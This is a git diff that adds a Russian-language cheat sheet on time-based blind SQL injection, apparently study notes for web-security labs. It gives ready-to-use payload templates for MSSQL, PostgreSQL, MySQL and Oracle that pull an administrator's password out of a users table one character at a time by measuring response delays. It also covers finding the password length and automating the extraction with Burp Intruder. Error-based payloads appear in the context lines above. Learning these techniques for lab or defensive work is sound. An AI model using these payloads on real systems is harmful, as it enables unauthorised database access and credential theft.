@@ -267,3 +267,106 @@ TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::in
 | **Oracle** | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''` |
 | **MySQL** | `' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--` |
 | **MSSQL** | `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1` |
+
+# ⏱️ Time‑based Blind SQL Injection — памятка
+
+## 🧠 Суть метода
+Когда приложение не показывает ошибки и не меняет содержимое страницы, но выполняет SQL‑запросы синхронно, можно использовать **задержки**.  
+Если условие истинно — база данных «спит» несколько секунд, и HTTP‑ответ задерживается. Если ложно — ответ приходит мгновенно.
+
+**Индикатор:** разница во времени ответа (например, 10 секунд vs 0,5 секунды).
+
+---
+
+## 🧩 Универсальный алгоритм
+
+1. **Найти точку входа** (параметр, cookie, заголовок).
+2. **Проверить, что задержка вообще работает** — отправить безусловную задержку (например, `WAITFOR DELAY '0:0:10'` для MSSQL).
+3. **Заменить условие на проверку символа** (например, `SUBSTRING(password,1,1)='a'`).
+4. **Перебирать символы и позиции**, собирая данные.
+
+---
+
+## 📌 Готовые шаблоны для разных СУБД
+
+### Microsoft SQL Server (MSSQL)
+ТВОЙ_ID'; IF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a') > 0 WAITFOR DELAY '0:0:10'--
+### PostgreSQL
+ТВОЙ_ID' ; SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+### MySQL
+ТВОЙ_ID' AND IF(SUBSTR(password,1,1)='a', SLEEP(10), 0)--
+### Oracle
+ТВОЙ_ID'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN dbms_pipe.receive_message('a',10) ELSE NULL END FROM users WHERE username='administrator')||'
+## 🔍 Определение длины пароля
+Используй условие с LENGTH(password)=N:
+### Пример для PostgreSQL:
+ТВОЙ_ID' ; SELECT CASE WHEN (LENGTH(password)=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--<br>
+Перебирай N от 1 до 30, пока не появится задержка. Это длина пароля.<br>
+
+**Автоматизация в Burp Intruder
+Вариант 1: перебор по одной позиции (Sniper)
+Позиция переменной: SUBSTR(password,1,1)='§a§'
+Тип атаки: Sniper
+Payload: символы a-z, 0-9
+Фильтр: сортировать по времени ответа (задержка = верный символ)**
+
+**Вариант 2: перебор всех позиций и символов (Cluster bomb)
+Переменные: SUBSTR(password,§1§,1)='§2§'
+Payload set 1: номера позиций (1..длина)
+Payload set 2: символы
+Тип атаки: Cluster bomb
+После атаки — отфильтровать строки с большим временем ответа (≈10 сек).**
+
+**Как анализировать результаты
+В Burp Intruder смотри на столбец Response received (время в миллисекундах):
+Запросы с задержкой > 9000 мс — это правильные пары (позиция, символ).
+Запросы с быстрым ответом (< 1000 мс) — не подходят.**
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
